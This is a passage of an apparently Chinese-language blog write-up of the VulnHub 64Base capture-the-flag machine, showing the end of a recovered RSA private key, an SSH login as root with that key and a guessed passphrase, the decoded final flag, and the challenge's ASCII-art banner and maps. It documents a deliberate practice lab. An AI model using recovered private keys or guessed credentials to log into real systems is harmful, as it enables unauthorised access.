class="line">Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj</span><br><span class="line">qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3</span><br><span class="line">64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P</span><br><span class="line">fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t</span><br><span class="line">/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>私鑰到手，接下來嘗試用這個私鑰看看能不能以 root 的身份登入 ssh：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 我已經把私鑰存在 key 這個檔案裡了</span><br><span class="line">$ ssh -p62964 root@192.168.31.184 -i key</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Screen%20Shot%202018-05-12%20at%2010.43.32%20PM.png"></p>
+<p>都到這一步了結果又要密碼！東想西想想到剛剛看到的那張圖片上面有字：<code>USE THE FORCE</code>，嘗試了一下最後用 <code>usetheforce</code> 成功登入了 root，flag6 到手。<br><img src="/Screen%20Shot%202018-05-12%20at%2010.45.07%20PM.png"></p>
+<p>最後 flag6 當然也還是來解碼一下，發現它十六進位 + base64 不斷的循環，重複解碼幾次以後得到最後的明文：<code>base64 -d /var/local/.luke|less.real</code> 是一條指令，當然就來去 VM 裡試試，原來是最後的小彩蛋 XDD，滿有趣的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line">        \ \        / / | | | |  __ \</span><br><span class="line">          \ \  /\  / /__| | | | |  | | ___  _ __   ___</span><br><span class="line">           \ \/  \/ / _ \ | | | |  | |/ _ \| &#x27;_ \ / _ \</span><br><span class="line">            \  /\  /  __/ | | | |__| | (_) | | | |  __/</span><br><span class="line">         __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _</span><br><span class="line">         \ \   / /          |  __ \(_)   | | |_   _| | | |</span><br><span class="line">          \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |</span><br><span class="line">           \   / _ \| | | | | |  | | |/ _` |   | | | __| |</span><br><span class="line">            | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|</span><br><span class="line">            |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)</span><br><span class="line"></span><br><span class="line">_____ _ _ _ __ __ __  _ ___ _   __  ___  __ __  __  _  ___ _ _  __ _________</span><br><span class="line">%=x%= | |V| |_)|_ |_) | |_| |   |_) |_| (_  |_  |_) |  |_| |\| (_  %=x%=x%=x</span><br><span class="line">~~~~~ | | | |  |_ | \ | | | |_  |_) | | __) |_  |   |_ | | | | __) ~~~~~~~~~</span><br><span class="line">LS</span><br><span class="line">                 .-. .-.</span><br><span class="line">               .=========.         E x t e r i o r ,   A e r i a l   V i e w</span><br><span class="line">               ||.-.7.-.||         -----------------------------------------</span><br><span class="line">               ||`-&#x27; `-&#x27;||</span><br><span class="line">               `=========&#x27;</span><br><span class="line">                `-&#x27;| |`-&#x27;8               1 .............. Sensor Suite Tower</span><br><span class="line">          ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets</span><br><span class="line">         /     /\__| |__/\     \         3 ............. Heavy Laser Turrets</span><br><span class="line">        /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes</span><br><span class="line">       /___(\\\/         \///)___\       5 ............... Heavy Blast Doors</span><br><span class="line">       \____\\`===========&#x27;//____/       6 .................... Guard towers</span><br><span class="line">       /     &#x27;/ .-------. \\     \       7 ........ Shuttle Landing Platform</span><br><span class="line">    __/     //. \`+---+&#x27;/ .\\     \__    8 ........... AT-AT Docking Station</span><br><span class="line">   /\ \    ///x`.\|___|/.&#x27;x\\\    / /\   9 ................. Connecting Ramp</span><br><span class="line">  /  \ \  //`-._//|   |\\_.2&#x27;\\  / /  \</span><br><span class="line"> /  _.-===&#x27;_____//.-=-.\\_____`===-._  \</span><br><span class="line"> \   `-===.\-.  \ `-=1&#x27; /  .-/.===-&#x27; 3 / The pre-fabricated,  multi-function</span><br><span class="line">  \  / /  \\\ \  \.===./  /4///  \ \  /  Imperial garrison base is the back-</span><br><span class="line">   \/_/    \\\ | /.---.\ | ///    \_\/   bone of the  Empire&#x27;s  occupational</span><br><span class="line">      \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-</span><br><span class="line">       \_____\=============/_____/       tresses have  walls up to 10 meters</span><br><span class="line">       /____///    ___    \\\____\       thick  to  guard   against   ground</span><br><span class="line">       \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector</span><br><span class="line">        \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or</span><br><span class="line">         \_____|  | 5 | 6|_____/         space attacks.</span><br><span class="line">               `--&#x27;   `--&#x27;</span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                           U           E x t e r i o r ,   S i d e   V i e w</span><br><span class="line">                          /_\          -------------------------------------</span><br><span class="line">                       1 [___]</span><br><span class="line">                         :`:&#x27;:           1 .............. Sensor Suite Tower</span><br><span class="line">                         `:::&#x27;           2 ... Heavy Twin Turbolaser Turrets</span><br><span class="line">                  _       :_:       _    3 ............. Heavy Laser Turrets</span><br><span class="line">                =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes</span><br><span class="line">                 :=:      :=:      :=:   5 ............... Heavy Blast Doors</span><br><span class="line">                _|_|_   __| |__   _|_|_  6 .................... Guard Towers</span><br><span class="line">               / /XX|\ /__|_|__\ /|XX\ \</span><br><span class="line">         3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker</span><br><span class="line">    --===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout</span><br><span class="line">     /__| |     /l_\\             //_|\     |_|__\</span><br><span class="line">    /~~.&#x27; |    /:&#x27;  \\   _____   //  `:\    | `.  \</span><br><span class="line">   /   | .&#x27;   / |    \\==|||||==//    | \   `. |   \   7    8</span><br><span class="line">  /   .&#x27; |   / .&#x27;     |  ||5|| 6|     `. \   | `.   \  xx=   _</span><br><span class="line"> /____|__|__/__|______l__|||||__l______|__\__|__|____\ ll   &lt;~</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                                                 O u t e r   D e f e n s e s</span><br><span class="line">            |                      |             ---------------------------</span><br><span class="line">         ^_[]_^                 ^_[]_^</span><br><span class="line">         |----|               5 |----|        1 ... High Voltage Death Fence</span><br><span class="line"> ________`-..-&#x27;________4________`-..-&#x27;______  2 ....... Perimeter Gate House</span><br><span class="line"> ===========================================  3 ........ Powered Force Field</span><br><span class="line">          `||&#x27;                   `||&#x27;         4 .......... Fortified Catwalk</span><br><span class="line">           ||     ^==^   ^==^     ||          5 ......... Observattion tower</span><br><span class="line"> ___.____._ll_._1_|--|   |--|___._ll_.____.____</span><br><span class="line"> XXX|XXXX|XIIX|XXX|--| 3 |--|XXX|XIIX|XXXX|XXXX</span><br><span class="line"> XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX</span><br><span class="line"></span><br><span class="line"> The outer perimeter is  marked  by a  high-voltage  &quot;death fence.&quot;  Powered</span><br><span class="line"> Force fields  placed at regular intervals along the fence may be turned off</span><br><span class="line"> to permit entry and exit.  Observation towers,  connected by fortified cat-</span><br><span class="line"> walks,  are set back from the fence and constantly manned by stormtroopers.</span><br><span class="line"> Other outer  defenses  include energy mine fields,  modified patrol Droids,</span><br><span class="line"> and AT-ST Scout Walkers.</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">             _</span><br><span class="line">            /|                               L a n d i n g   P l a t f o r m</span><br><span class="line">          -==+                               -------------------------------</span><br><span class="line">            :</span><br><span class="line">         [__________]               Up to two Lambda-class shuttles and four</span><br><span class="line">         `&#x27; ||  ||`-&#x27;               AT-AT  Walkers can dock at the platform.</span><br><span class="line">           ========  =xx            A loading  ramp  leads directly from the</span><br><span class="line">            ||  ||    ll            platform into the garrison complex.</span><br><span class="line">     ~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                                     I n t e r i o r ,   L e v e l s   1 - 5</span><br><span class="line">                                     ---------------------------------------</span><br><span class="line"></span><br><span class="line">          ______         ______      The first 5 levels of the garrison com-</span><br><span class="line">         / ____ \_______/ ____ \     plex are of identical layout, construc-</span><br><span class="line">        / /    \_________/    \ \    ted  around  a  level-spanning  surface</span><br><span class="line">       / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to</span><br><span class="line">       \ \       \_____/_______/ /   determine what each level contains.</span><br><span class="line">       / /    o   |o o|   o    \ \</span><br><span class="line">    __/ /  2    .&#x27; o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),</span><br><span class="line">   / __/      .&#x27; ._o_o_. `.      \__ \         Armory (levels 3-4), Training</span><br><span class="line">  / /  `-.  .&#x27; .&#x27;  10   `. `.  .-&#x27;  \ \        Facilities   and   Recreation</span><br><span class="line"> / /      ~&#x27; .&#x27;`-._____.-&#x27;`. `~      \ \       Rooms (level 5)</span><br><span class="line"> \ \     o  &lt;  C  | | |  D  &gt;  o  7  / / 2 ... Stormtrooper Barracks (levels</span><br><span class="line">  \ \__      \    &#x27; &#x27; &#x27;    /      __/ /        1-3),    Security    Barracks</span><br><span class="line">   \__ \  1  |----  9  ----|~-._ / __/         (levels 4-5)</span><br><span class="line">      \ \    |====    B====|    Y /      3 ...... Base Security (levels 1-5)</span><br><span class="line">       \ \   |----     ----|   / /       4 ......... Turbolifts (levels 1-6)</span><br><span class="line">       / /   |__A_     _ __| 8 \ \       5 .... Detention Block (levels 1-5)</span><br><span class="line">       \ \      | |   | |      / /       6 ... Technical and Service Person-</span><br><span class="line">        \ \_____| |   | |_____/ /              nel Barracks (levels 1-5)</span><br><span class="line">         \_____ `o|   |o&#x27; _____/         7 ... Technical Shops (levels 1-2),</span><br><span class="line">               `--&#x27;   `--&#x27;                     Medical   Bay    (level   3),</span><br><span class="line">                                               Science Labs (levels 4-5)</span><br><span class="line">                8 ... Storage Gallery (levels 1-2), Droid Shops (levels 3-5)</span><br><span class="line">                9 ...................... Surface Vehicle  Bay  (levels 1-5):</span><br><span class="line">                A .................................. AT-ST Scout Walker Bays</span><br><span class="line">                B ........................................ AT-AT Walker Bays</span><br><span class="line">                C ...................... Vehicle Maintenance and Repair Deck</span><br><span class="line">                D ........................................ Speeder Bike Deck</span><br><span class="line">                10 ........................... Miscellaneous Vehicle Parking</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                                           I n t e r i o r ,   L e v e l   6</span><br><span class="line">                                           ---------------------------------</span><br><span class="line">         ____           ____</span><br><span class="line">        / __ \_________/ __ \        Base command personnel,  control rooms,</span><br><span class="line">       / /  \___________/  \ \       rooms,  trade  mission,  and diplomatic</span><br><span class="line">       \ \ o     oo      o / /       offices are located on this level.</span><br><span class="line">       / /       oo----.   \ \</span><br><span class="line">      / /   8  __oo     `.1 \ \      1 ....... Sensor Monitors, Tractor Beam</span><br><span class="line">   __/ /\    .~  ||   2   \  \ \__                       and Shield Controls</span><br><span class="line">  / __/  \ .&#x27; 9.-&#x27;`-.      | /\__ \  2 ....................... Computer Room</span><br><span class="line"> / /   o  \|__:   o  :_____|/ o  \ \ 3 ....................... Meeting Rooms</span><br><span class="line"> \ \__  7 .---: 10   :------.3 __/ / 4 ...... Officers&#x27; and Pilots&#x27; Quarters</span><br><span class="line">  \__ \  /     `-..-&#x27;        \/ __/  5 ... Trade Mission, Diplomatic Offices</span><br><span class="line">     \ \/\   5   ||          / /     6 ........... Base Commander&#x27;s Quarters</span><br><span class="line">      \ \ `.     ||    4    / /                                  and offices</span><br><span class="line">       \ \ o~`---||      o / /       7 ............ Officer Recreation Rooms</span><br><span class="line">       / /6  ____||_____   \ \       8 ............................. Offices</span><br><span class="line">       \ \__/ _________ \__/ /       9 ................... Base Control Room</span><br><span class="line">        \____/         \____/        10 ..................... Reception Area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                                           I n t e r i o r ,   L e v e l   7</span><br><span class="line">                                           ---------------------------------</span><br><span class="line">        __             __</span><br><span class="line">       /_]\           /[_\        The TIE Fighter  Hanger  Deck  houses  the</span><br><span class="line">       \ \,===========./ /        garrison&#x27;s TIE fighters in standard-design</span><br><span class="line">       //:o-----------o:\\        ceiling racks.  Bases are usually equipped</span><br><span class="line">      /// X  X X X X  X \\\       with  30 TIE fighters and five TIE bombers</span><br><span class="line">     /// X X  X_X_X  X X \\\      (a single  bomber  takes  up the same rack</span><br><span class="line">  __/// X X   [___]   X X \\\__   space as two fighters).  Five  to 15 ships</span><br><span class="line"> /\_/o X X  1 &amp;/3\&amp;    X X o\_/\  are on constant  patrol,  depending on the</span><br><span class="line"> \]_\\ X X   &lt;\\_//&gt;       //_[/  base&#x27;s readiness level.</span><br><span class="line">    \\\ X X   \&gt;&amp;&lt;/2  X []///</span><br><span class="line">     \\\ X X   []    X []///      1 .............. TIE Fighter Ceiling Racks</span><br><span class="line">      \\\ X   [] []     ///                           (holds up to 40 craft)</span><br><span class="line">       \\:o-----------o://        2 ............. Lift Platforms, to Level 8</span><br><span class="line">       /_/`===========&#x27;\_\        3 .................. Flight Control Center</span><br><span class="line">       \_]/           \[_/        X ............................ TIE Fighter</span><br><span class="line">                                  [] ............................ TIE Bomber</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                                           I n t e r i o r ,   L e v e l   8</span><br><span class="line">                                           ---------------------------------</span><br><span class="line">                                                      (not shown)</span><br><span class="line"></span><br><span class="line">  The Flight Deck contains the  tractor beam  generators which catapult out-</span><br><span class="line">  going craft into the open sky and reel in landing ships. Pilots relinquish</span><br><span class="line">  control of  their ships during take off and landing because of the limited</span><br><span class="line">  maneuvering area within the chutes.</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">                               S u b - L e v e l   I n s t a l l a t i o n s</span><br><span class="line">                               ---------------------------------------------</span><br><span class="line">                                                (not shown)</span><br><span class="line"></span><br><span class="line">  A large underground section of the base  houses the main power and back-up</span><br><span class="line">  generators, the tractor beam and deflector shield generators, the environ-</span><br><span class="line">  ment  control  station,  and  the  waste  disposal and refuse units.  Some</span><br><span class="line">  storage facilities are also located here.</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line">%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">Version 1.9 (released 941211).</span><br><span class="line"> Pictures by Lennert Stock  (LS),  Rowan Crawford (-Row),  Ray Brunner,  Bob</span><br><span class="line"> VanderClay and Joe Rumsey.  The pictures work best when shown on a white on</span><br><span class="line"> black screen  (except for some faces)  with a not too fancy font. Contribu-</span><br><span class="line"> tions welcome, email to the adress below. Sources LS: The Star Wars Source-</span><br><span class="line"> book,  Star Wars Imperial Sourcebook,  The Star Wars Rebel Alliance Source-</span><br><span class="line"> book, Star Wars: The Roleplaying Game (2nd Ed) all by West End Games, Inc.</span><br><span class="line"></span><br><span class="line">____________________________________________________________________________</span><br><span class="line"></span><br><span class="line">  ______  ______  ______  ______  ______  ______  ______  ______  </span><br><span class="line"> |______||______||______||______||______||______||______||______||______|</span><br><span class="line">  _   _   ____ __          __ __     __ ____   _    _  _  _____   ______  </span><br><span class="line"> | \ | | / __ \\ \        / / \ \   / // __ \ | |  | |( )|  __ \ |  ____|</span><br><span class="line"> |  \| || |  | |\ \  /\  / /   \ \_/ /| |  | || |  | ||/ | |__) || |__</span><br><span class="line"> | . ` || |  | | \ \/  \/ /     \   / | |  | || |  | |   |  _  / |  __|</span><br><span class="line"> | |\  || |__| |  \  /\  /       | |  | |__| || |__| |   | | \ \ | |____  </span><br><span class="line"> |_| \_| \____/    \/  \/        |_|   \____/  \____/    |_|  \_\|______|</span><br><span class="line">                                _  ______  _____  _____  _</span><br><span class="line">             /\                | ||  ____||  __ \|_   _|| |</span><br><span class="line">            /  \               | || |__   | |  | | | |  | |</span><br><span class="line">           / /\ \          _   | ||  __|  | |  | | | |  | |</span><br><span class="line">          / ____ \        | |__| || |____ | |__| |_| |_ |_|</span><br><span class="line">         /_/    \_\        \____/ |______||_____/|_____|(_)</span><br><span class="line">  ______  ______  ______  ______  ______  ______  ______  ______  ______  </span><br><span class="line"> |______||______||______||______||______||______||______||______||______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    I hope you enjoyed this challenge</span><br><span class="line">                    Please leave comments &amp; feedback</span><br><span class="line">                    @ https://www.vulnhub.com/?q=64base</span><br><span class="line">                    -----------------------------------</span><br><span class="line">                    64Base Challenge by 3mrgnc3</span><br><span class="line">                    @ https://3mrgnc3.ninja</span><br><span class="line">                    -----------------------------------</span><br></pre></td></tr></table></figure>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/Writeups/" rel="tag">Writeups</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/VulnHub/VulnHub-JIS-CTF-VulnUpload/"
+                    data-tooltip="VulnHub #JIS-CTF:VulnUpload"
+                    aria-label="PREVIOUS: VulnHub #JIS-CTF:VulnUpload"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/TAMUctf/TAMUctf-18/"
+                    data-tooltip="TAMUctf 18"
+                    aria-label="NEXT: TAMUctf 18"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/VulnHub/VulnHub-JIS-CTF-VulnUpload/"
+                    data-tooltip="VulnHub #JIS-CTF:VulnUpload"
+                    aria-label="PREVIOUS: VulnHub #JIS-CTF:VulnUpload"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/TAMUctf/TAMUctf-18/"
+                    data-tooltip="TAMUctf 18"
